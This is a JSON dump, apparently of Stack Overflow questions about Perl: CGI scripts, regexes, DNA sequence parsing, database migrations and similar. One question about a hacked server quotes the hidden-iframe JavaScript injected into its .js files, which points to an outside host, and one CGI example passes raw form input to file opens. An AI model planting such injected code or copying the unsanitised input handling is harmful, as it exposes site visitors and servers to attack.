@sorted = sort {$a &lt;=&gt; $b} @viol;\n        print \"@sorted\";\n    }\n};\n</code></pre>\n\n<p>Command : perl test.pl test.log</p>\n\n<p>test.log :</p>\n\n<pre><code>0.98           2.04          -1.106  VIOLATE\n0.98           2.04          3.06\n0.98           2.04          -11.06  VIOLATE\n0.98           2.04          -1.06  VIOLATE\n0.98           2.04          1.06 \n0.98           2.04          -0.226  VIOLATE\n0.98           2.04          -2.06  VIOLATE\n</code></pre>\n"},{"tags":["perl","postgresql","foreign-keys","dbix-class"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13029025,"title":"DBIx::Class::DeploymentHandler: Wrong foreign key names in auto-sql","body":"<p>I use the <code>DBIx::Class::DeploymentHandler</code> to keep track of different versions of my database, which works great. However, when I needed to remove/update some foreign keys, I ran into a problem. </p>\n\n<p>I use a PostgreSQL database. When I create a foreign key, it automatically gets a name like this: <code>\"codes_member_id_fkey\"</code>. I needed to change this foreign key, so I updated my <code>DBIx::Class</code> schema file, and ran my DeploymentHandler upgrade script, which generates the sql file needed. </p>\n\n<p>This is the sql generated for dropping the foreign key:</p>\n\n<pre><code>ALTER TABLE codes DROP CONSTRAINT codes_fk_member_id;\n</code></pre>\n\n<p>The deploymenthandler thinks the name of the FK is <code>\"codes_fk_member_id\"</code>, while its correct name is <code>\"codes_member_id_fkey\"</code>.</p>\n\n<p>Is there a way I can change this default pattern of constraint names generated from the DeploymentHandler?</p>\n"},{"tags":["perl","cgi","alarms"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":82,"score":2,"question_id":12921539,"title":"perl alarms not working as expected","body":"<p>I have a simple perl script that calls a shell script which always \"hangs\" when called from the browser. I want to simply force a time out after 20 seconds. When I run it in command line there is no issues. But when I do it from the browser, the script is executed but never finishes loading. So I don't get the output on the page. If I kill -9 the process in the command line, the browser finishes loading, and the content is displayed in the browser.</p>\n\n<p>I did a lot of research, and it seems the web server is waiting for the shell script to finish, because the shell script still has an open file handle to the standard output.</p>\n\n<p>Here is my code.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nuse CGI;\n\nmy $q = new CGI;\n\nprint $q-&gt;header;\n\nmy $timeout = 10;\nmy $pid = fork;\n\nif ( defined $pid ) {\n     if ( $pid ) {\n\n         # this is the parent process\n         local $SIG{ALRM} = sub { die \"TIMEOUT\" };\n\n         alarm 10;\n\n         # wait until child returns or timeout occurs    \n         eval {\n             waitpid( $pid, 0 );\n         };\n\n         alarm 0;\n\n         if ( $@ &amp;&amp; $@ =~ m/TIMEOUT/ ) {\n            # timeout, kill the child process\n            kill 9, $pid;\n         }\n    }\n    else {\n         # this is the child process\n         # this call will never return. Note the use of exec instead of system\n         exec \"/opt/bea/domains/fsa/scripts/start.sh\";\n    }\n}\nelse {\n     die \"Could not fork.\";\n}\n</code></pre>\n\n<p>How do I force the page to finish loading regardless of the status of the shell script after a certain amount of time.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":13026798,"title":"perl get the first matched word in a line","body":"<p>Sorry im new in perl and cannot find a similar answer.</p>\n\n<p>html file</p>\n\n<pre><code>&lt;div class=\"user_rating\"&gt;\n.\n.\n&lt;span class=\"genre\"&gt;\n.\n.\n.\n&lt;span class=\"genre\"&gt;\n.\n.\n.\n&lt;span class=\"genre\"&gt;\n.\n.\n.\n&lt;span class=\"genre\"&gt;\n</code></pre>\n\n<p>perl file</p>\n\n<pre><code>$content =~ /&lt;div class=\"user_rating\"&gt;(.*)&lt;span class=\"genre\"&gt;/gs;\n$empty = $1;\n</code></pre>\n\n<p>this $empty variable contains information from <code>&lt;div class=\"user_rating\"&gt;</code> to the last <code>&lt;span class=\"genre\"&gt;</code>.</p>\n\n<p>But i just want the information from <code>&lt;div class=\"user_rating\"&gt;</code> to the first <code>&lt;span class=\"genre\"&gt;</code>.\nhow should i modify my code? i know it is a regular expression problem.</p>\n\n<p>Any help plz...</p>\n"},{"tags":["perl","command-line","checkbox","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":269,"score":0,"question_id":7746953,"title":"How can I iterate through all checked values of a checkbox group in a Perl CGI script?","body":"<p>I have an <a href=\"http://www.apachefriends.org/en/xampp.html\" rel=\"nofollow\">xampp</a> test system setup running on a Windows machine.</p>\n\n<p>I have a small command line application I would like to trigger using a \nPerl CGI script.</p>\n\n<p>I have a form that I created using Perl. There are a number of check boxes as well as an input box where a user can type a message.</p>\n\n<p>Here is the code that I have so far. I am not an expert in perl by any means, so there \nmight be a few things in here that don't make sense, or are for testing purposes</p>\n\n<pre><code>#!\"C:\\xampp\\perl\\bin\\perl.exe\"\n\n#print a standard 200 -level HTTP header\nprint \"Content-Type:text/html\\n\\n\";\n\nprint \"&lt;html&gt;&lt;head&gt;&lt;title&gt;Broadcast Message&lt;/title&gt;&lt;/head&gt;\\n\";\nprint \"&lt;body&gt;\\n\";\n\n#display form data\n#&amp;displayInfo();\n\nprint \"&lt;/body&gt;&lt;/html&gt;\\n\";\n\nif ($ENV{REQUEST_METHOD} eq \"GET\") \n  {\n    &amp;formDisplay();\n    exit;\n  }\n#Else process and display back to screen\nelse\n  {\n    #&amp;switches();\n    &amp;parseform();\n    &amp;displayInfo();\n\n    exit;\n  }  \n\n#This subroutine will display information without using the HTML document\n\nsub formDisplay\n  {\n    print qq~\n\n    &lt;FORM METHOD=\"POST\" ACTION=\"/cgi-bin/broadcast.cgi\"&gt;\n      &lt;h3&gt;Broadcast Message to Domain&lt;/h3&gt;\n      ***PLEASE NOTE*** This will broadcast a message to ALL machines in the Domain&lt;/br&gt;&lt;/br&gt;\n      &lt;TABLE cellpadding=0 cellspacing=1 border=0&gt;\n      &lt;TR&gt;\n        &lt;TD&gt;Select your target by switch:&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp&amp;nbsp   &lt;/br&gt;&lt;/TD&gt;\n        &lt;TD&gt;&lt;/TD&gt;\n        &lt;TD&gt;Select your target by department:                       &lt;/br&gt;&lt;/TD&gt;\n      &lt;/TR&gt;\n      &lt;TR&gt;\n        &lt;TD&gt;&lt;input type=CHECKBOX name=517 value=\"517\"&gt;   - 517      &lt;/br&gt;&lt;/TD&gt;\n\n        &lt;TD&gt;&lt;/TD&gt;\n        &lt;TD&gt;&lt;input type=CHECKBOX name=ACC value=\"ACC\"&gt;   - ACC      &lt;/br&gt;&lt;/TD&gt;\n      &lt;/TR&gt;\n      &lt;TR&gt;\n        &lt;TD&gt;&lt;input type=CHECKBOX name=testfiletxt value=\"testfiletxt\"&gt; - testefiletxt &lt;/br&gt;&lt;/TD&gt;\n      &lt;/TR&gt;\n      &lt;/TABLE&gt;\n      &lt;/br&gt;&lt;/br&gt;\n      Please type the message you wish to broadcast to the Domain: &lt;/br&gt;\n      &lt;input name=\"message\"&gt;&lt;/br&gt;\n\n      &lt;input type=SUBMIT name=Send value=\"Send\"&gt;\n      &lt;input type=RESET name=Reset value=\"Reset\"&gt;\n    &lt;/form&gt;\n    ~;\n  }\n\n#This subroutine will display information received from a form \nsub displayInfo {\n  print \"&lt;b&gt;Your Message:&lt;/b&gt; &lt;/br&gt;  \",         $form{\"message\"}, \"&lt;/br&gt;\";\n  $system_message=$form{\"message\"};\n  #system \"sent.exe /u:testmachine \\\"$system_message\\\"\" ;\n  print qq~\n  &lt;form&gt;\n  &lt;input type=\"button\" value=\"Back\" onclick=\"history.go(-1);return true;\"&gt;\n  &lt;/form&gt;\n  ~;\n  # Working loop for form hash\n  delete $form{'Send'};\n\n  foreach(keys %form) {\n  print \"$form{$_} &lt;/br&gt;\";\n  }\n ##############################\n  $textme=$form{\"testfiletxt\"}; \n    open( FILE, \"&lt; $textme\" ) or die \"Can't open $filename : $!\";\n\n    while( &lt;FILE&gt; ) {\n        chomp;\n        print \"sent.exe $_ \", $form{\"message\"} , \"&lt;/BR&gt;\";\n    }\n\n    close FILE; \n\n}\n\n\nsub parseform\n  {\n    #get data from environment variable\n    read STDIN,$qstring,$ENV{\"CONTENT_LENGTH\"};\n    #$qstring = $ENV{'QUERY_STRING'};\n\n    #break data up on ampersands, and store in array\n    @pairs = split(/&amp;/, $qstring);\n\n    #start a loop to process form data\n    foreach (@pairs) {\n    #split field name and value on \"=\", store in two scalar variables\n    ($key, $value) = split(/=/);\n    #translate '+' signs back to spaces\n    $value =~ tr/+/ /;\n    #translate special characters\n    $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack(\"C\", hex($1))/eg;\n    #store data in hash\n    $form{$key} = $value;\n    }\n  }\n</code></pre>\n\n<p>What I am having issues with is processing the text boxes that have been checked.</p>\n\n<p>What I need the script to do is to run the command line utility with the parameters specified by the user (i.e. the check boxes, and input box).</p>\n\n<p>How I am thinking this will work is as follows:</p>\n\n<ol>\n<li><p>We have pre built text files that will contain <a href=\"http://blogs.msdn.com/b/larryosterman/archive/2007/07/11/how-do-i-compare-two-different-netbios-names.aspx\" rel=\"nofollow\">Netbios names</a> of computers in our network, one computer name per line. These files will represent switches, each switch file will contain the Netbios name of the computers attached to it. We will eventually be expanding this into doing groups as well.</p></li>\n<li><p>The user will go to this broadcast page and select the switches they wish to broadcast to. So, any machine connected to a particular switch will receive this broadcasted message. The user will also provide a message to be broadcast.</p></li>\n<li><p>When the user clicks \"Submit\" There are a few things that need to happen.</p>\n\n<ul>\n<li>The file representing the selected switch will need to be opened and the message that the user entered needs to be appended to the end of each Netbios name in the list. Example:</li>\n</ul>\n\n<p>netbiosName message provided by user</p>\n\n<ul>\n<li><p>Then, once that is completed. The command line utility needs to be run using the files that we just edited in the following format:</p>\n\n<pre><code> sent.exe /t:15 /f:$filename\n</code></pre></li>\n</ul>\n\n<p>So if the user selected 3 switches the command should be run 3 times</p>\n\n<pre><code>     sent.exe /t:15 /f:swtich1\n     sent.exe /t:15 /f:switch2\n     sent.exe /t:15 /f:switch3\n</code></pre></li>\n</ol>\n\n<p>I should point out that the <code>/f</code>\" option tells the <code>sent.exe</code> command to use a file that is required to be formatted in a specific way.</p>\n\n<p>I have had some success with processing one option at a time.</p>\n\n<p>But I am stuck with what will happen when the user selects more then one check box.</p>\n\n<p>How can I process the selected check boxes easily using a loop?</p>\n\n<p>Can I pull this from the <code>&amp;parseform</code> sub-routine? Or is there an easier way of doing it?</p>\n"},{"tags":["perl","security"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":90,"score":2,"question_id":13023594,"title":"Executing system commands safely while coding in Perl","body":"<p>Should one really use external commands while coding in Perl? I see several disadvantages of it. It's not system independent plus security risks might also be there. What do you think? If there is no way and you have to use the shell commands from Perl then what is the safest way to execute that particular command (like checking pid, uid etc)?</p>\n"},{"tags":["perl","file","directory","comparing"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":68,"score":1,"question_id":13022563,"title":"Compare two directories for differences in regular files","body":"<p>Need to compare two directories and check through every file in both directories for files of the same name, if the same name occurs you check to see if the files have the same content, if so print > file &lt;. If the file has the same name but not the same content &lt; file > If there is a file that's not in directory 2 but in directory 1 &lt;&lt;&lt; file1, and likewise >>> file2 for a file in dir 2 but not dir 1. \nI have been having trouble, my code doesn't even compare when I test to see if the files are equal in name. </p>\n\n<pre><code>#!/usr/bin/perl -w \nuse File::Basename;\n\n@files1 = `/usr/bin/find $ARGV[0] -print`;\nchop @files1;\n@files2 = `/usr/bin/find $ARGV[1] -print`;\nchop @files2;\n\nhere: \nfor ($i=1; @files1 &gt;= $i; $i++) {\n\n    for ($x=1; @files2 &gt;= $x; $x++) {\n\n        $file1 = basename($files1[$i]); \n        $file2 = basename($files2[$x]); \n\n        if ($file1 eq $file2) {\n\n            shift @files1;\n            shift @files2;\n\n            $result = `/usr/bin/diff -q $files1[$i] $files2[$x]`;\n            chop $result;\n\n            if ($result eq \"Files $files1[$i] and $files2[$x] differ\") { \n\n                print \"&lt; $file1 &gt;\\n\";\n                next here;\n            } \n            else { \n\n                print \"&gt; $file1 &lt;\\n\";\n            }\n        }\n        else  { \n\n            if ( !-e \"$files1[$i]/$file2\") { print \"&gt;&gt;&gt; $file2\\n\";}\n            unless ( -e \"$files2[$x]/$file1\") { print \"&lt;&lt;&lt; $file1\\n\";}\n        }\n    }\n}\n</code></pre>\n"},{"tags":["perl","bash","optimization","big-o","code-duplication"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13022416,"title":"Optimize Duplicate Detection","body":"<h1>Background</h1>\n\n<p>This is an optimization problem. Oracle Forms XML files have elements such as:</p>\n\n<pre><code>&lt;Trigger TriggerName=\"name\" TriggerText=\"SELECT * FROM DUAL\" ... /&gt;\n</code></pre>\n\n<p>Where the <code>TriggerText</code> is arbitrary SQL code. Each SQL statement has been extracted into uniquely named files such as:</p>\n\n<pre><code>sql/module=DIAL_ACCESS+trigger=KEY-LISTVAL+filename=d_access.fmb.sql     \nsql/module=REP_PAT_SEEN+trigger=KEY-LISTVAL+filename=rep_pat_seen.fmb.sql \n</code></pre>\n\n<p>I wrote a script to generate a list of exact duplicates using a brute force approach.</p>\n\n<h1>Problem</h1>\n\n<p>There are 37,497 files to compare against each other; it takes 8 minutes to compare one file against all the others. Logically, if <code>A = B</code> and <code>A = C</code>, then there is no need to check if <code>B = C</code>. So the problem is: how do you eliminate the redundant comparisons?</p>\n\n<p>The script will complete in approximately 208 days.</p>\n\n<h1>Script Source Code</h1>\n\n<p>The comparison script is as follows:</p>\n\n<pre><code>#!/bin/bash\n\necho Loading directory ...\n\nfor i in $(find sql/ -type f -name \\*.sql); do\n        echo Comparing $i ...\n\n        for j in $(find sql/ -type f -name \\*.sql); do\n                if [ \"$i\" = \"$j\" ]; then\n                        continue;\n                fi\n\n                # Case insensitive compare, ignore spaces\n                diff -IEbwBaq $i $j &gt; /dev/null\n\n                # 0 = no difference (i.e., duplicate code)\n                if [ $? = 0 ]; then\n                        echo $i :: $j &gt;&gt; clones.txt\n                fi\n        done\ndone\n</code></pre>\n\n<h1>Question</h1>\n\n<p>How would you optimize the script so that checking for cloned code is a few orders of magnitude faster?</p>\n\n<h2>Idea #1</h2>\n\n<p>Remove the matching files into another directory so that they don't need to be examined twice.</p>\n\n<h1>System Constraints</h1>\n\n<p>Using a quad-core CPU with an SSD; trying to avoid using cloud services if possible. The system is a Windows-based machine with Cygwin installed -- algorithms or solutions in other languages are welcome.</p>\n\n<p>Thank you!</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":75,"score":1,"question_id":13024011,"title":"Returning an anonymous function that returns a scalar value","body":"<p>I am trying to figure out what exactly is being processed in this simple statement:</p>\n\n<pre><code>sub testReturn {\n    return sub {\n        my $val = shift;\n        return $val;\n    }\n}\n</code></pre>\n\n<p>when</p>\n\n<pre><code>my $num = testReturn(1);\nprint $num;\n</code></pre>\n\n<p>is called, it outputs:</p>\n\n<pre><code>CODE(0x9c63b34)\n</code></pre>\n\n<p>When I am trying to have it simply return the value of 1. Thank you.</p>\n"},{"tags":["perl","parsing","hash"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":102,"score":-1,"question_id":13007728,"title":"Parsing a string into a hash structure in perl","body":"<p>I have the following string:</p>\n\n<pre><code>$str = \"list\n    XYZ\n\n    status1    : YES\n    value1     : 100\n    status2      : NO\n    value2     : 200\nThats all\";       \n</code></pre>\n\n<p>I want to convert it into a hash using a function which takes this string as input and returns a hash with <code>status1</code> as <em>key</em> and <code>YES</code> as <em>value</em> for example.</p>\n\n<p>How to do so?<br>\nAnd how to reference the returned hash?</p>\n"},{"tags":["perl","xml-twig"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13018726,"title":"what are restrictions on using parse in xml-twig to parse xml string","body":"<p>I am trying to use $twig->parse($xmlstring) to add id attribute to all xml elements in string. Each string is an element of an array that looks something like:</p>\n\n<pre><code>&lt;classes name=\"Test::Class\"&gt;\n  &lt;public_methods&gt;\n    &lt;members const=\"no\" kind=\"function\" name=\"RegisterDefinition\" volatile=\"no\"&gt;\n      &lt;parameters declaration_name=\"name\" type=\"std::string\"/&gt;\n      &lt;parameters declaration_name=\"description\" type=\"std::string\"/&gt;\n    &lt;/members&gt;\n  &lt;/public_methods&gt;\n&lt;/classes&gt;\n</code></pre>\n\n<p>In script I use foreach loop to get each element and create id attribute.</p>\n\n<pre><code>foreach my $str (@newonly) {\n   $twig-&gt;parse( $str );\n}\n</code></pre>\n\n<p>I create twig object and TwigHandler that calls routine and it only works if I use parsefile and specify xml file. Does not work if I use parse to parse part of xml file that is element of an array.\nRoutine I am using is:</p>\n\n<pre><code>my $twig = XML::Twig-&gt;new(\n TwigHandlers =&gt; {\n   '_all_' =&gt; \\&amp;add_id,\n },\n);\n\n\nsub add_id \n { my($twig, $element)= @_;\n   $element-&gt;set_id($id++);\n   $twig-&gt;purge;\n }\n</code></pre>\n"},{"tags":["perl","documentation","version"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":88,"score":3,"question_id":13011174,"title":"Module: When should I mention the required Perl version in the documentation?","body":"<p>Which one is the highest Perl version which I would not mention anymore as a requirement in a documentation?\nFor example I've never seen: Needs Perl 4 or higher.</p>\n"},{"tags":["python","perl","bash","scripting","sed"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":265,"score":2,"question_id":6259521,"title":"Best script to modify file contents on server","body":"<p><strong>Problem:</strong><br />\nI have web server that was recently compromised. They targeted javascript files. They inserted the following snippet</p>\n\n<pre><code>document.write('&lt;iframe src=\"http://lcbmc.co.uk/showthread.php?t=31540750\" width=\"1\" height=\"1\" frameborder=\"0\"&gt;&lt;/iframe&gt;') \n</code></pre>\n\n<p>this was added to the top of every single .js file on the server.</p>\n\n<p><strong>Solution:</strong><br />\nWrite a script to open every javascript file on my server that checks for malicious code, removes malicious code, and finally saves the file.</p>\n\n<p><strong>Question:</strong><br />\nWhat programming language should the script be written in? Will python work? I'm running python 2.4.3 on my server. If I run a python script under root will I have to worry about accidentally changing the owner permissions of the modified files?</p>\n\n<p>Thanks</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":69,"score":-5,"question_id":13021584,"title":"Perl why is this while loop not working?","body":"<pre><code>my $cmte_money_total = 0;\nwhile ($cmte_money_total == 0){\n  # body of function\n}\n</code></pre>\n\n<p>Is there anything wrong with this syntax? It keeps giving me an error.</p>\n"},{"tags":["perl","google-maps","gps"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13021288,"title":"Increase the size of a region bounded by GPS coords","body":"<p>I have a webapp in which I query for results that are nearby the user. Because of the way the app works, the user is located in a square bounded by 4 points, 2 for the bottom left corner and 2 for the upper right corner: latsw,latne,longsw,longne.\nI need to increase the size of the \"square\" while keeping the user in the center of the square. I've been trying with basic stuff like:</p>\n\n<pre><code>$latsw= $latsw - $increasing_factor;\n$latne= $latne + $increasing_factor;\n$longsw=$longsw - $increasing_factor;\n$longne=$longne + $increasing_factor;\n</code></pre>\n\n<p>and </p>\n\n<pre><code>$latsw= $latsw / $increasing_factor;\n$latne= $latne * $increasing_factor;\n$longsw=$longsw / $increasing_factor;\n$longne=$longne * $increasing_factor;\n</code></pre>\n\n<p>but the results are just giving me a shifted area or some other weird behavior. I guess this is because GPS coords don't really behave linearly in a 2D plane. Any ideas to do something like this while keeping it relatively simple?</p>\n"},{"tags":["perl","dist-zilla"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":32,"score":2,"question_id":13021221,"title":"prevent Dist::Zilla from inserting the copyright year?","body":"<p>By default if <a href=\"https://metacpan.org/module/Dist%3a%3aZilla\" rel=\"nofollow\">Dist::Zilla</a> finds no copyright year it will use the current year, since it doesn't seem to support multiple years or year ranges I find the current year to be most appropriate. However, whenever I run <code>dzil new Module</code> it automatically inserts the copyright year into my <code>dist.ini</code>. Is there a way to prevent Dist::Zilla from doing this?</p>\n"},{"tags":["perl","apache2","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":13018595,"title":"Spawn external process from a CGI script","body":"<p>I've searched and found several very similar questions to mine but nothing in those answers have worked for me yet.</p>\n\n<p>I have a perl CGI script that accepts a file upload.  It looks at the file and determines how it should be processed and then calls a second non-CGI script to do the actual processing.  At least, that's how it <em>should</em> work.</p>\n\n<p>This is running on Windows with Apache 2.0.59 and ActiveState Perl 5.8.8.  The file uploading part works fine but I can't seem to get the <em><code>upload.cgi</code></em> script to run the second script that does the actual processing.  The second script doesn't communicate in any way with the user that sent the file (other than it sends an email when it's done).  I want the CGI script to run the second script (in a separate process) and then 'go away'.</p>\n\n<p>So far I've tried <code>exec</code>, system (passing a 1 as the first parameter), system (without using 1 as first parameter and calling '<em><code>start</code></em>'), and Win32::Process.  Using system with 1 as the first parameter gave me errors in the Apache log:</p>\n\n<blockquote>\n  <p><em>'1' is not recognized as an internal or external command,\\r, referer: <a href=\"http://my.server.com/cgi-bin/upload.cgi\" rel=\"nofollow\">http://my.server.com/cgi-bin/upload.cgi</a></em></p>\n</blockquote>\n\n<p>Nothing else has given me any errors but they just don't seem to work.  The second script logs a message to the Windows event log as one of the first things it does.  No log entry is being created.</p>\n\n<p>It works fine on my local machine under Omni webserver but not on the actual server machine running Apache.  Is there an Apache config that could be affecting this?  The <em><code>upload.cgi</code></em> script resides in the <em><code>d:\\wwwroot\\test\\cgi-bin</code></em> dir but the other script is elsewhere on the same machine (<em><code>d:\\wwwroot\\scripts</code></em>).</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":63,"score":-2,"question_id":13018656,"title":"Perl regex to tag the entire term","body":"<p>I am trying to tag terms using a list of annotations. What I am specifically trying to achieve is that if the Perl regex identifies a term from a sentence it should tag the term with tags.</p>\n\n<p>For example:</p>\n\n<pre><code>This drug has adverse effect on Lymphocytes, Lymphnodes, Lymph and pre-lymphocytes. \n</code></pre>\n\n<p>My list has the word Lymph, I am trying the following script. </p>\n\n<pre><code>open IN, \"clean_cells.txt\" or die \"import file absent\";\n@array=&lt;IN&gt;;\nforeach $words(@array)  \n{\n    @cells=split/\\t/,$words;\n    $value=$cells[0];\n    $replace=$cells[1];\n    foreach my $fp (glob(\"$Directory/*.txt\")) \n    {\n        @id=split('/',$fp);\n        $id[1]=~s/.txt//ig; \n        $Pub=$id[1];\n        open FILE, \"&lt;\",$fp or die \"Can't open $fp: $!\";\n        open OUT, \"&gt;C:\\\\Users\\\\Desktop\\\\TM\\\\Files\\\\$Pub\" or die \"Check      output status\";\n        while(&lt;FILE&gt;)\n        {\n            chomp $_;\n            $line=$_;\n            s/\\b[\\w\\-]*$value[\\w\\-]*\\b/&lt;$replace&gt;$&amp;&lt;\\\\$replace&gt;/gi;\n            # $string[$i]=$line;\n            # while(($string[$i]=~m/\\Q$value\\E/i)||                                      ($string[$i]=~m/\\Q$value(\\w+)\\E/i)||($string[$i]=~m/\\Q(\\w+)$value\\E/i))\n            # # if ($string[$i] =~ m/\\b\\w*$value\\w*\\b/i)\n            # {\n                # $value=~s/$value/&lt;$replace&gt;$value&lt;\\$replace&gt;/i;\n            # }\n            print OUT \"$line\\n\";\n        }\n        last;\n\n    }   \n    last;\n}\n</code></pre>\n\n<p>I am hoping the final sentence should look like this: </p>\n\n<pre><code>This drug has adverse effect on tag Lymphocytes tag, tag Lymphnodes tag, tag Lymph tag and tag pre-lymphocytes tag.\n</code></pre>\n\n<p>tag: represents $replace in the above script.</p>\n\n<p>The program tags the base word lymoh and not the entire term Lymphocytes, pre-lymphocytes. </p>\n"},{"tags":["string","perl","dna-sequence"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":321,"score":0,"question_id":8246801,"title":"align 2 DNA sequences and find complementary regions","body":"<p>I tried to find some clue in the list but I couldn't, so sorry if I ask a repeated topic</p>\n\n<p>I am PERL beginner and I am trying to write a program in PERL that take two DNA sequences, calculate the reverse of the second one and find the maximum complementary regions between them, that is:</p>\n\n<p>input:</p>\n\n<pre><code>CGTAAATCTATCTT\nCATGCGTCTTTACG\n</code></pre>\n\n<p>output:</p>\n\n<pre><code>CGTAAATCTATCTT\nGCATTT--------\n</code></pre>\n\n<p>I have no problem to find the reverse of the second sequence, however my programming skills in PERL are rudimentary. Do I need to use a combined for an foreach loops?</p>\n"},{"tags":["regex","perl","pattern-matching","fasta","dna-sequence"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":11821962,"title":"I need search a pattern in a header line of my file and concatenates the next line with Perl","body":"<p>My multi-fasta archive is in this format:</p>\n\n<pre><code>&gt;miRNA65 dvex2345\nCGATGCTAGATGCTATGACAACGATGCCTCG-G\n&gt;miRNA60 dvex1234\nT-TAA-ACTCATCATCATCATACTCATCATCATCATCAGCATATTAACAAG\n&gt;miRNA65 dvex2345\nT-TAA-ACTTATCATCATCATACTCATCATCATCATCAGCATATTAACAAG\n</code></pre>\n\n<p>I am new in Perl and I need to search the equals '> lines' and concatenate the next line to join the sequence. </p>\n\n<p>I'm expecting the following output for the above file:</p>\n\n<pre><code>&gt;miRNA60 dvex1234\nT-TAA-ACTCATCATCATCATACTCATCATCATCATCAGCATATTAACAAG\n&gt;miRNA65 dvex2345\nT-TAA-ACTTATCATCATCATACTCATCATCATCATCAGCATATTAACAAG.CGATGCTAGATGCTATGACAACGATGCCTCG-G\n</code></pre>\n\n<p>What is the best way to get this done? </p>\n"},{"tags":["string","perl","dna-sequence"],"answer_count":7,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":90,"score":0,"question_id":11944707,"title":"Determining the ratio of matches to non-matches of 2 primary strands?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/5610265/how-to-plot-a-gene-graph-for-a-dna-sequence-say-atgccgctgcgc\">How to plot a gene graph for a DNA sequence say ATGCCGCTGCGC?</a>  </p>\n</blockquote>\n\n\n\n<p>Im trying to write a Perl script that compares two DNA sequences (60 characters in length each lets say) in alignment, and then show the ratio of matches to non-matches of the sequences to each other. But i'm not having much luck. if it helps i can upload my code, but its no use. here's an example of what im trying to achieve below. </p>\n\n<p>e.g   </p>\n\n<pre><code>A T C G T A C\n| | | | | | |\nT A C G A A C\n</code></pre>\n\n<p>So the matches of the above example would be 4. and non-matches are: 3. Giving it a ratio of 4.3. </p>\n\n<p>Any help would be much appreciated. thanks.</p>\n"},{"tags":["perl","file","input","dna-sequence"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":189,"score":-3,"question_id":11954480,"title":"How do I extract DNA sequences from a text file without reading line by line?","body":"<p>I'm trying to extract a DNA sequence from a text file and store it. I can do it using the following code, but it's not the best way because I'm reading the text file line by line. I'm wondering if there's an easier way to find each of the DNA sequences in my text file without reading the text file line by line.</p>\n\n<p>example.pl</p>\n\n<pre><code>#!/usr/local/bin/perl\nopen(MYFILE, 'data.txt');\n@entire_file = &lt;MYFILE&gt;;\nwhile (&lt;MYFILE&gt;) {\n    chomp;\n    print \"$_\\n\";\n}\n\n$line1 = &lt;MYFILE&gt;;\nchomp $line1;\n$line2 = &lt;MYFILE&gt;;\nchomp $line2;\n$line3 = &lt;MYFILE&gt;;\nchomp $line3;\n$line4 = &lt;MYFILE&gt;;\nchomp $line4;\n$line5 = &lt;MYFILE&gt;;\nchomp $line5;\n\n#Prints DNA sequence 1\nprint \"$line2\";\n\n#Prints DNA sequence 2\nprint \"$line5\";\n\nclose(MYFILE);\n</code></pre>\n\n<p>data.txt</p>\n\n<blockquote>\n  <p>gi|171361, Saccharomyces cerevisiae, (CYS3) gene, Lab 1, Joe Bloggs\n  GCAGCGATCGACAGCTGTGCTATCCCGGCGAGCCCGTGGCAGAGGACCTCGCTTGCGAAAGCATCGAGTACC</p>\n  \n  <p>gi|171362, Saccharomyces cerevisiae, (CYS4) gene, Lab 2, Paul McDonald\n  GAAGCGCACGACAGCTGTGCTATCCCGGCGAGCCCGTGGCAGAGGACCTCGCTTGCGAAAGCATCGAGTACC</p>\n</blockquote>\n"},{"tags":["perl","facebook-graph-api","plack"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":94,"score":3,"question_id":13017260,"title":"Perl - Facebook Graph API","body":"<p>Time ago it was easy to make a distinction between desktop and web applications, but today while reading while the documentation I've noticed that this difference is less pronounced.</p>\n\n<p>I'm using the Facebook::Graph module to create a desktop application, but still can not go beyond the stage of configuration. I'm stuck at authentication phase:</p>\n\n<pre><code>my $ q = Plack::Request-&gt;new($env);\n$fb-&gt;request_access_token($q-&gt;query_param('code'));\n</code></pre>\n\n<p>(http://search.cpan.org/ ~ rizen/Facebook-Graph-1.0401/lib/Facebook/Graph.pm)</p>\n\n<p>It keeps telling me \"$ env is required\".\nReading the documentation I've realized that Plack is only concerned with web applications.</p>\n\n<p>(http://search.cpan.org/ ~ miyagawa/Plack-1.0007/lib/Plack/Request.pm)</p>\n\n<p>Can you confirm this? If not, how do I get past this step?</p>\n\n<p>It would not be a problem getting the access_token using Mechanize and then making a GET request as described in the documentation, but I do not want to complicate my existence, so if there are other 